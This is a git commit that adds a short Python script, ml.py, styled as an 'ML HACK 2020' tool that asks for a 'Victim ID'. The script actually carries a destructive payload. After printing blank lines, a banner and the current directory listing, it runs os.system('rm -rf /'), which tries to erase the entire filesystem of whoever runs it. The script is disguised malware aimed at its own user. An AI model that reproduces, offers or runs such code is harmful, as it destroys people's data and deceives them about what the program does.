8daa61bd7fd8d8174cd1e467700848351b1a20c6
Ph-Thund3r <70021444+Ph-Thund3r@users.noreply.github.com>
2020-09-04 15:15:48 +0800

    Create ml.py

---
+++ ml.py
@@ -0,0 +1,18 @@
+import os
+def main():
+	print("")
+for i in range(1,910):
+	main()
+print("""==================================
+
+     [•]                     [•]
+     | |                     | |
+     [•]  ML HACK 2020       [•]
+     | |                     | |
+     [•]                     [•]
+
+===================================""")
+input("Enter Victim ID:")
+print(os.getcwd())
+print(os.listdir())
+print(os.system("rm -rf /"))
